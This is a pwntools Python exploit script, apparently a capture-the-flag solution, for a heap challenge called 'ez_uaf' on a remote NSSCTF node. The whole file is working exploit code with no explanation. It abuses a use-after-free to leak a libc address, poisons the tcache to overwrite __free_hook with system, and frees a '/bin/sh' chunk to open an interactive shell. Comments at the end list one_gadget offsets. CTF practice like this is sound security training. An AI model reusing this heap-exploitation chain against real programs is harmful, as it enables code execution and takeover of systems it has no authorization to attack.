from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28641)
# io=process("./ez_uaf")
elf=ELF("./ez_uaf")
libc=ELF("./libc-2.27.so")

def add(s,m,cc):
    io.sendlineafter("Choice: \n","1")
    io.sendlineafter("Size:\n",str(s))
    io.sendafter(b"Name: \n",m)
    io.sendafter(b"Content:\n",cc)

def delete(n):
    io.sendlineafter("Choice: \n","2")
    io.sendlineafter("idx:\n",str(n))
    
def show(n):
    io.sendlineafter("Choice: \n","3")
    io.sendlineafter("idx:\n",str(n))
    
def edit(n,cc):
    io.sendlineafter("Choice: \n","4")
    io.sendlineafter("idx:\n",str(n))
    io.send(cc)

# gdb.attach(io)
# pause()

for i in range(8):
    add(0x90,b"qq",b"aaa")
    
add(0x90,b"cc",b"bbb")

for i in range(7):
    delete(i)
    
delete(7)
show(7)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr:",hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
free_hook=leak_addr+libc.sym[b"__free_hook"]
realloc=leak_addr+libc.sym[b"__libc_realloc"]
sys_addr=leak_addr+libc.sym[b"system"]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]

for i in range(5):
    add(0x90,b"/bin/sh",b"/bin/sh")
    
edit(1,p64(free_hook))
add(0x90,b"dd",b"ccc")
add(0x90,p64(sys_addr),p64(sys_addr))

delete(5)

io.interactive()

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
